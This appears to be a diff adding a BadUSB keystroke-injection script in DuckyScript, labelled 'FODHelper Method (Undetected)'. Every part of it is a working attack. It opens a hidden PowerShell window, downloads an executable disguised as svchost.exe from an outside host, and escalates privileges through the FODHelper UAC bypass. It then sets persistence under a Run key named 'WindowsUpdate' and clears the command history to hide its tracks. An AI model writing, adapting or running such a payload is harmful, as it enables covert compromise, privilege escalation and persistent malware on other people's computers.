@@ -1,0 +1,56 @@
+REM ============================================
+REM BadUSB - FODHelper Method (Undetected)
+REM ============================================
+
+DELAY 2500
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+DELAY 200
+ENTER
+DELAY 2000
+
+REM Download
+STRING Invoke-WebRequest -Uri "https://bootless.ir/svchost.exe" -OutFile "$env:TEMP\svchost.exe" -UseBasicParsing
+ENTER
+DELAY 4000
+
+REM FODHelper UAC Bypass
+STRING New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force; Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$env:TEMP\svchost.exe" -Force; Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force; Start-Process "fodhelper.exe" -WindowStyle Hidden; Start-Sleep -Seconds 4; Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
+ENTER
+DELAY 5000
+
+REM Persistence via Registry (Not Startup)
+STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "$env:TEMP\svchost.exe" -Force
+ENTER
+DELAY 500
+
+STRING Clear-History; exit
+ENTER
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
